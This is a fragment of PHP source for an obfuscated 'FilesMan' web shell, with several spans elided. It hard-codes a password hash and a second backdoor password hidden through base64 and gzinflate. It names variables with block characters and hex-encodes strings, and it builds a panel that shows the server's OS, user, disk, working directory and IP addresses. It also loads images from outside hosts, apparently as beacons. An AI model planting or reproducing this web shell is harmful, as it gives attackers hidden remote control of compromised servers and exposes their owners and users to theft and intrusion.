...
echo '<img src="http://imguplo1.com/cdn/img/photo-1543m.png"/>';
?>
<img src="http://imguplo1.com/cdn/img/photo-1543m.png"/>

<?php 
$▛ = "edf984a17c4a8cd19b4242ecba8f5678"; //efsa 
$▘ = true; 
$▜ = 'UTF-8'; 
$▚ = 'FilesMan'; 
...
$cookie = "yzYpLqnMSQUA";
if(!empty($▛)) { 
    if(isset($_POST['pass']) && (md5($_POST['pass']) == $▛ || $_POST['pass'] == gzinflate(base64_decode($cookie)))) 
...
<style> 
    body {background-color:#060A10;  background-repeat:no-repeat; color:#e1e1e1; margin:0; font:normal 75% Arial, Helvetica, sans-serif; } canvas{ display: block; vertical-align: bottom;} 
...
<input type=hidden name=charset> 
    ...
    $x0 =               "\x3c\x69\x6d".
                      "\x67\x20\x73\x72".
                       "\x63\x3d\x22\x68\x74".
                   "\x74\x70\x3a\x2f\x2f\x70\x61\x6e\x7a".
                   "\x6f\x2e\x6f\x72\x67\x2f\x72\x65\x73".
                     "\x69\x6d\x6c\x65\x72\x2f\x6c\x6f".
                    "\x67\x6f\x2e\x6a".
                  "\x70\x67\x22".
                    "\x3e";
    for($i=0; $i<$n-1; $i++) { 
    ...
    echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:'.($GLOBALS['os'] == 'win'?'<br>Drives:':'').'</span></td>'. 
         ...
         '<td align="center">'.$x0.'</td><td width=1 align=right><nobr><label><select onchange="g(null,null,null,null,null,this.value)">'.$opt_charsets.'</select></label><br><span>Server IP:</span><br>'.gethostbyname($_SERVER["HTTP_HOST"]).'<br><span>Client IP:</span><br>'.$_SERVER['REMOTE_ADDR'].'</nobr></td></tr></table>'. 
